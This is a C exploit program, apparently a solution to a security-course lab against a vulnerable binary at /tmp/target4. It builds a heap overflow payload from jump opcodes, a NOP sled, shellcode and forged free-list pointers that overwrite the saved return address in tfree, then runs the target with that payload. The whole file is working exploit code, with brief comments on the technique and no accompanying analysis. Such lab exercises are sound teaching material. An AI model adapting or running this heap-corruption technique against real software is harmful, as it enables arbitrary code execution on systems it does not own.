#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];

  char crack_str[1537];
  int i;

  for(i = 0; i < 100; i+=2){
    crack_str[i] = '\xEB';
    crack_str[i+1] = '\x7F';
  } //JUMP OP CODE
  for(; i< 1483; i++) crack_str[i] = '\x90'; //NOP SLEDDD
  strcpy(&crack_str[1483], shellcode); //shellcode
  strcpy(&crack_str[1528], "\xA8\x94\x05\x08"); //Left pointer of heap list. points to somewhere in \x41 land. This will be our new eip.
  strcpy(&crack_str[1532], "\x4C\xF8\xFF\xBF"); //Right pointer of heap list. points to saved eip in tfree.

  args[0] = TARGET;
  args[1] = crack_str;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
